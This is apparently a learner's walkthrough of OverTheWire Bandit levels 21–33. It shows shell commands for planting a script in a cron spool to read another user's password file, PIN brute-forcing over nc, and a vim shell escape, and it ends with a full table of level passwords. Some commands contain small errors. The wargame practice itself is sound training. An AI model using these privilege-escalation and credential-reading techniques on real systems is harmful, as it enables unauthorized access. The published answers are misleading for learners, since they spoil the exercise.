
## Bandit 21

```
ssh bandit.labs.overthewire.org -p 2220 -l bandit21
EeoULMCra2q0dSkYj561DX7s1CpBuOBt
```

- reading cronjob files
- cronjob is copying the content of `/etc/bandit_pass/bandit22` to `/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv`

```
cat /etc/cron.d/cronjob_bandit22
cat /usr/bin/cronjob_bandit22.sh
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

## Bandit 22

```
ssh bandit.labs.overthewire.org -p 2220 -l bandit22
tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
```

- scripts runs as bandit23 every min 
- if we run it the user is bandit22

```
cat /etc/cron.d/cronjob_bandit23
cat /usr/bin/cronjob_bandit23.sh
```

- edit the script 

```bash
#!/bin/bash

myname="bandit23"
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

```
cd /tmp
mkdir asd
cd asd
nano a.sh
#paste the edited script
chmod 777 a.sh 
bash a.sh
# copy the path
cat /tmp/8ca319486bfbbc3663ea0fbe81326349/tmp/8ca319486bfbbc3663ea0fbe81326349
```
## Bandit 23

```
ssh bandit.labs.overthewire.org -p 2220 -l bandit23
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
```

- cron job runs as bandit24 and the script is given
- executes and deletes files 

```
cd /etc/cron.d/
cat cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
mkdir -p /tmp/notalppp
cd /tmp/notalppp
nano exp
```

```
#!/bin/bash
cat /etc/bandit_pass/bandit24 >> /tmp/notalppp/pass
```

```
chmod 777 exp
cp exp /var/spool/bandit24/foo
#after 2mins 
cat pass
```

## Bandit24

```
ssh bandit.labs.overthewire.org -p 2220 -l bandit24
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

- have to bruteforce using nc
- make a bash script to make a bruteforce pattern like $password $id

```
for i in {0000 .. 9999}
do 
	echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i
done
```

```
chmod 777 brute 
bash brute > pins
nc localhost 30002 < pins
```

## Bandit 25
# THIS LEVEL HAS MENTALLY DARINED ME

```
ssh bandit.labs.overthewire.org -p 2220 -l bandit25
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

```
ssh -i bandit26.sshkey bandit26@localhost -p 2220
```
- open kali
- open a normal terminal
- DONOT USE WINDOWS TERMINAL IF DO SO TRY TO USE CMD
- use ssh to login to bandit26
- before clicking enter 
- make the terminal so smallllll
- then type `v` to enter vim mode 

```
ssh -i ./bandit26.sshkey bandit26@localhost -p 2220
v
:e /etc/bandit_pass/bandit26
```

the story does not ends here 
- even if you have the pass for level 26 what will ya do ?
- again stuck on banner ?
- lets get shell with vim 
- :shell does noting coz ht e shell is set to showtext which is more 
- asked chatgpt it said to change shell 

```
:set shell=/bin/bash
:shell
./bandit27 cat /etc/bandit_pass/bandit27
```

## Bandit27

```
ssh bandit.labs.overthewire.org -p 2220 -l bandit27
upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
```

- simpily have to use git 
- read man

```
cd /tmp/notalppp
git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
yes
upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
cd repo 
cat README
```

## Bandit28

```
ssh bandit.labs.overthewire.org -p 2220 -l bandit28
Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN
```

- using git explore it

```
cd /tmp/notalppp
mkdir tm
cd tm
git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo
Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN
cd repo
cat README.md
file README.md
```

- file has password censored :pepecri:
- check more info

```
git logs
#shows 3 commits
copy the id of previious one 
git checkout 73f5d0435070c8922da12177dc93f40b2285e22a
cat README.md
```

## Bandit 29

```
ssh bandit.labs.overthewire.org -p 2220 -l bandit29
4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7
```

- cloned the repo 
- read me says no password in production 
- developers have diffent branches for testing out stuff 
- so there must be a development branch 
- tried `git checkout development` no luck 
- tried getting commit using `git log` nothing
- try `git branch`

```
git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo

git branch -a
git checkout remotes/origin/dev
cat README.md
```

## bandit30

```
ssh bandit.labs.overthewire.org -p 2220 -l bandit30
qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL
```

- cloned repo 
- nothing in readme file 
- i went searching inside the `.git` file 
- found nothing 
- read manuals there was a tags

```
git tags --help
git tag -l
secret
git show secret
```

## Bandit31

```
ssh bandit.labs.overthewire.org -p 2220 -l bandit31
fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy
```

- we have to push to the repo 

```
echo "May I come in?" > key.txt
git add .
git commit -m "GIMMEKYS"
#hmm nothing? lets see .gitignorefile
#remove:*.txt from .gitignore file\
git add *
git commit -m "GIMMEKEYSORKYS"
git push
```

## Bandit32

```
ssh bandit.labs.overthewire.org -p 2220 -l bandit32
3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K
```

- read the manual page of sh very thoroughly 
- VERY VERY VEYR thoroughly 
- i just sent it to chatpgt and asked it alot of questions

```
$0
ls -al
whoami
#ohh
cat /etc/bandit_pass/bandit33
```

- asked chatgpt what is uppercase shell its basically a shell ran with arguments in fornt of it to make everything uppercase 
- $0 make it such as no args is passed

## Bandit33

```
NO NEW LEVELS LESSGOO!!!!
```

## ALL passwords

| Usernames | Passwords                        |
| --------- | -------------------------------- |
| bandit21  | EeoULMCra2q0dSkYj561DX7s1CpBuOBt |
| bandit22  | tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q |
| bandit23  | 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga |
| bandit24  | gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 |
| bandit25  | iCi86ttT4KSNe1armKiwbQNmB3YJP3q4 |
| bandit26  | s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ |
| bandit27  | upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB |
| bandit28  | Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN |
| bandit29  | 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7 |
| banidt30  | qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL |
| bandit31  | fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy |
| bandit32  | 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K |
| bandit33  | tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0 |
